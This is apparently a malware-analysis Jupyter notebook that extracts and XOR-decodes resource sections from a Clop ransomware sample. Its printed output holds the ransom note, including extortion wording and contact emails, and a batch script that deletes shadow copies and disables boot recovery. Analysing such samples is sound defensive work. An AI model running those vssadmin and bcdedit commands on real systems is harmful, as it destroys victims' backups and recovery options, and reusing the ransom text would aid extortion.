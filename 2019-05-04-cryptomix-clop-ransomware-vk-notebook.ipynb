{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-05-05T05:45:13.275719Z",
     "start_time": "2019-05-05T05:45:13.139463Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "[*] First decoded resource section: \n",
      "^_^_^-|>>>Your networks has been penetrated^_^_^-|>>>\r\n",
      "All files on each host in the networks have been encrypted with a strong algorithm.!!\r\n",
      "Backups were either encrypted or deleted or backup disks were formatted.!!\r\n",
      "Shadow copies also removed,so F8 or any other methods may damage encrypted data but not recover.!!\r\n",
      "We exclusively have decryption software for your situations.!!\r\n",
      "^_^_^-|>>>No DECRYPTION software is AVAILABLE in the PUBLIC^_^_^-|>>>\r\n",
      "^_^_^-|>>>DO NOT RENAME OR MOVE the encrypted and readme files^_^_^-|>>>\r\n",
      "^_^_^-|>>> DO NOT RESET OR SHUTDOWN � FILES MAY BE DAMAGED^_^_^-|>>>\r\n",
      "^_^_^-|>>>THIS MAY LEAD TO THE IMPOSSIBILITY OF RECOVERY OF THE CERTAIN FILES^_^_^-|>>>\r\n",
      "^_^_^-|>>>ALL REPAIR TOOLS ARE USELESS AND CAN DESTROY YOUR FILES IRREVERSIBLY^_^_^-|>>>\r\n",
      "If you want to restore your files write to email.\r\n",
      "[CONTACTS ARE AT THE BOTTOM OF THE SHEET] and attach 3 - 5 encrypted file.\r\n",
      "[Less than 7 Mb each, non-archived and your files should not contain valuable information!\r\n",
      "[Databases,large excel sheets,backups etc]!!!!\r\n",
      "\r\n",
      "^^^YOU WILL RECEIVE DECRYPTED SAMPLES AND OUR CONDITIONS HOW TO GET THE DECODERs^^^\r\n",
      "\r\n",
      "-=- ATTENTION -=-\r\n",
      "^_^_^-|>>>YOUR WARRANTY - DECRYPTED SAMPLES^_^_^-|>>>\r\n",
      "^_^_^-|>>>DO NOT TRY TO DECRYPT YOUR DATA USING THIRD PARTY SOFTWARE^_^_^-|>>>\r\n",
      "^_^_^-|>>>WE DONT NEED YOUR FILES AND YOUR INFORMATION^_^_^-|>>>\r\n",
      "\r\n",
      "CONTACT EMAIL: \r\n",
      "cersiacsofal@protonmail.com\r\n",
      "AND\r\n",
      "unlock@eqaltech.su\r\n",
      "OR\r\n",
      "unlock@royalmail.su\r\n",
      "  \r\n",
      "^_^_^-|>>>NOTHING PERSONAL JUST BUSINESS^_^_^-|>>>!  \r\n",
      "^_^_^-|>>>> C|0P^_- <^_^_^-|>>>\n",
      "\n",
      "[*] Second decoded resource section: \n",
      "@echo off\r\n",
      "vssadmin Delete Shadows /all /quiet\r\n",
      "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB\r\n",
      "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded\r\n",
      "vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB\r\n",
      "vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded\r\n",
      "vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB\r\n",
      "vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded\r\n",
      "bcdedit /set {default} bootstatuspolicy ignoreallfailures\t\r\n",
      "bcdedit /set {default} recoveryenabled No\r\n",
      "vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB\r\n",
      "vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded\r\n",
      "vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB\r\n",
      "vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded\r\n",
      "vssadmin Delete Shadows /all /quiet\t\t\r\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import pefile\n",
    "import argparse\n",
    "\n",
    "#the variable used to store our raw config data\n",
    "first_blob = \"\" \n",
    "second_blob = \"\" \n",
    "size = 0x0\n",
    "key=bytearray(b'pZmIWEQ8432JjFWELJR321IKUI9jkfhWLJKER2798UjkfhgWJKOIEHnqApOSDKJRHUWQOJHIugrfujOWIOTHYOIJ432456')\n",
    "xor_key = 0x42\n",
    "\n",
    "def get_section_blob(peL, rsrc_name):\n",
    "    offset = 0x0\n",
    "    size = 0x0\n",
    "    for rsrc in peL.DIRECTORY_ENTRY_RESOURCE.entries:\n",
    "        if rsrc.name.__str__() == rsrc_name:\n",
    "            for entry in rsrc.directory.entries:\n",
    "                offset = entry.directory.entries[0].data.struct.OffsetToData\n",
    "                size = entry.directory.entries[0].data.struct.Size\n",
    "    return peL.get_memory_mapped_image()[offset:offset+size]\n",
    "\n",
    "\n",
    "def xor_decode(key, blob):\n",
    "    xor_key = 0x42\n",
    "    encoded = bytearray(blob)\n",
    "    for i in range(len(encoded)):\n",
    "        encoded[i] ^= key[i % xor_key]\n",
    "        encoded.decode('ascii', 'replace')\n",
    "    return encoded\n",
    "\n",
    "pe = pefile.PE(\"/Users/vk/Downloads/3.exe\")\n",
    "rsrc = get_section_blob(pe,\"RC_DATA\")\n",
    "#print(rsrc)\n",
    "rsrc2 = get_section_blob(pe,\"RC_HTML1\")\n",
    "#print(rsrc2)\n",
    "dec_rsrc1 = xor_decode(key, rsrc)\n",
    "dec_rsrc2 = xor_decode(key, rsrc2)\n",
    "if dec_rsrc1 and dec_rsrc2 is not None:\n",
    "    print(\"\\n[*] First decoded resource section: \\n%s\" % (dec_rsrc1.decode(\"utf-8\",\"replace\")))\n",
    "    print(\"\\n[*] Second decoded resource section: \\n%s\" % (dec_rsrc2.decode(\"utf-8\", \"replace\")))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
